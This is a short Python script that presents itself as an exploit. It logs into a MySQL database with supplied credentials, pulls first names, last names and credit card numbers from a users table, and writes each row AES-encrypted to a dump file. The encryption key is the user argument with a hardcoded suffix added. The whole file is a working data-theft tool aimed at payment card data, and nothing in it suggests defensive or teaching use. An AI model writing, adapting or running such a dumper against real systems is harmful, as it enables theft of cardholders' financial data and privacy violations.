#!/usr/bin/env python3

import argparse
import mysql.connector
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os
import base64

class DataDump:
    def __init__(self, out, user, passw, key, host, db, table):

        self.dump_file = out
        self.table = table
        self.key = key
        self.config = {
            'user': user,
            'password': passw,
            'host': host,
            'database': db
        }

    def encrypt_data(self, data):
        # Derive a 256-bit key from the provided string
        digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
        digest.update(self.key.encode())
        key = digest.finalize()

        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data.encode()) + padder.finalize()

        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(padded_data) + encryptor.finalize()

        return base64.b64encode(iv + ct).decode()

    def dump_database(self):
        print("[+] Dumping database...")
        conn = mysql.connector.connect(**self.config)
        cursor = conn.cursor()

        cursor.execute("SELECT first_name, last_name, credit_card FROM users")
        rows = cursor.fetchall()

        with open(self.dump_file, 'w') as f:
            for row in rows:
                encoded_data = self.encrypt_data(", ".join(filter(None, row)))
                f.write(encoded_data + "\n")

        cursor.close()
        conn.close()

    def run(self):
        self.dump_database()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("-o", "--out", type=str)
    parser.add_argument("-u", "--user", type=str)
    parser.add_argument("-p", "--passw", type=str)
    parser.add_argument("-k", "--key", type=str)
    parser.add_argument("-i", "--ip", type=str)
    parser.add_argument("-db", "--database", type=str)
    parser.add_argument("-t", "--table", type=str)

    argv = parser.parse_args()

    out = argv.out
    user = argv.user
    passw = argv.passw
    key = argv.key + "M5-r4Ce}"
    host = argv.ip
    db = argv.database
    table = argv.table

    exploit = DataDump(out, user, passw, key, host, db, table)
    exploit.run()
